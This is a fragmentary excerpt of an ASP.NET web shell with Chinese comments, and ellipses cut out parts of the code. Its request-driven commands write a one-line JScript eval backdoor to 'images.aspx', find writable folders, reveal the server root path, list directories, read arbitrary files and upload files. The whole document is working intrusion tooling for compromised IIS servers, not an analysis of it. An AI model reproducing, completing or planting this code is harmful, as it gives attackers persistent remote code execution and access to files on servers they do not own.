...
<script runat="server">
    ...
    protected void Page_Load(object sender, EventArgs e)
    {
        if (!IsCallback)
        {
            ...
            //1、获取IIS中其它站点 Command=IIS
            if (Command == "ForceDirectories".ToUpper())
            {
                ForceDirectories(Request.Params["filename"]);
            }
            //2、执行一句话，保存为文件，然后返回网址
            else if (Command == "OneWord".ToUpper())
            {
                System.IO.StreamWriter ow = new System.IO.StreamWriter(Server.MapPath("images.aspx"), false);
                ow.Write("<%@ Page Language=\"Jscript\" validateRequest=\"false\" %><%eval(Request.Item[\"guige\"],\"unsafe\");%>");
                ow.Close();
            }
            //2、测试  入参 Command=FolderCheck
            else if (Command == "FolderCheck".ToUpper())
            {
                string rootpath = Server.MapPath("~");
								if(can_create_folder(rootpath))
								{
									Response.Write("<code>0</code>");
								}else
								{
									Response.Write("<code>999</code>");
									DirectoryInfo Bin_dir = new DirectoryInfo(rootpath);
									foreach (DirectoryInfo Bin_folder in Bin_dir.GetDirectories())
									{
									    string foldername = formatpath(rootpath) + "\\" + formatfile(Bin_folder.Name)+ "\\";
									    if(can_create_folder(foldername))
									    {
									    	foldername = foldername.Replace(@"\\", @"\");
									    	foldername = foldername.Replace(@"\", @"/");
									    	Response.Write("<folder>"+foldername+"</folder>\r\n");
									    }
									}
								}
            ...
            else if (Command == "getrootpath".ToUpper())
            {
                ...
                Response.Write("<rootpath>"+Server.MapPath("~")+"</rootpath>");
            }
            ...
            else if (Command == "GetFoldersandFileCount".ToUpper())
            {
                ...
                //列举某个目录下的所有文件夹
                if(Request.Params["onlyfolder"]=="1")
                {
                	Bin_FileList_Level(CurrentFolder, FileCount ,true);
                }else
                {
                	Bin_FileList_Level(CurrentFolder, FileCount ,false);
                }
            }
            ...
            else if (Command == "GetFileText".ToUpper())
            {
                ...
                Response.Write("<_Result_>"+SR.ReadToEnd()+"  </_Result_>");
                SR.Close();
                Response.End();
            }
...
public bool can_create_folder(string Bin_path)
{
	string newdir = Bin_path + "/13986496350";
	try{
...
public void ForceDirectories(string filename) 
{
	...
	{		
		...
		{
			foldername = filename.Substring(0, i);
    ...
    //file文件夹列表  Level 几级
    public void Bin_FileList_Level(string Bin_path,int Level,bool onlyfolder)
    {
        string tmpstr = "";
        string parstr = "";
        if (Level < 0)
        ...
        for (int i = 1; i < files_arr.Length; i++)
        {
            if (Level > 0)
            {
                Bin_FileList_Level(files_arr[i], Level,onlyfolder);
            }
        }
    ...
    protected void Bin_upButton_Click(object sender, EventArgs e)
    {
        ...
        try
        {
            ForceDirectories(uppath + Path.GetFileName(Bin_UpFile.Value));
    ...
    public void Bin_FileRN(string instr, int type)
    {
            if (type == 1)
            {
                ...
                if (File.Exists(array[1]))
                {
				 ...
				 Response.Write("<status>fail"+array[1]+"</status>");
				}
            }
            if (type == 2)
            {
